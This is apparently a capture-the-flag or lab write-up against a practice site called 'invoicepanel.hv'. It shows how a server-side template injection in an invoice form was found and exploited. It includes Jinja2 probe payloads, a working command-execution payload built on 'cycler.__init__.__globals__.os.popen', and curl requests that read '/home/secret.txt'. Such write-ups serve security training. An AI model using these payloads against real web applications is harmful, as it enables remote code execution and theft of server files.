# Invoicepanel - SSTI Writeup

## Information

- **URL**: <http://invoicepanel.hv>
- **IP**: 172.20.29.166
- **Vulnerability**: Server-Side Template Injection (SSTI)

## Objective

Exploit an SSTI vulnerability to read the file `/home/secret.txt`.

## Steps

1. **Reconnaissance**
    - Accessed `http://invoicepanel.hv` and navigated to `/create_invoice`.
    - Found a form to create invoices with fields for `customer_name`, `date`, `item`, and `total`. A template is likely used to display the invoice.

2. **Vulnerability Analysis**
    - The application may be vulnerable to SSTI if user input is directly rendered into a template.
    - Test payloads used: `{{7*7}}`, `{{7*'7'}}`.
    - If `{{7*7}}` returns `49`, it indicates a vulnerability. If `{{7*'7'}}` returns `7777777`, it strongly suggests Jinja2 (Python).

3. **Exploitation**
    - Injected `{{7*7}}` into the `customer_name` field.

    ```bash
    curl -X POST -d "customer_name={{7*7}}&date=2023-01-01&item=Server&total=100" http://invoicepanel.hv/create_invoice
    ```

    - The response contained `49`, confirming SSTI.
    - Used a standard Jinja2 payload to execute system commands:

    ```python
    {{ cycler.__init__.__globals__.os.popen('cat /home/secret.txt').read() }}
    ```

4. **Data Extraction**
    - Injected the payload into the `customer_name` field.

    ```bash
    curl -X POST -d "customer_name={{ cycler.__init__.__globals__.os.popen('cat /home/secret.txt').read() }}&date=2023-01-01&item=Server&total=100" http://invoicepanel.hv/create_invoice
    ```

    - The server processed the input and executed the `cat` command.
    - The resulting content was rendered in the invoice.

## Result

The secret information contained in the file is: **Riddikulus**
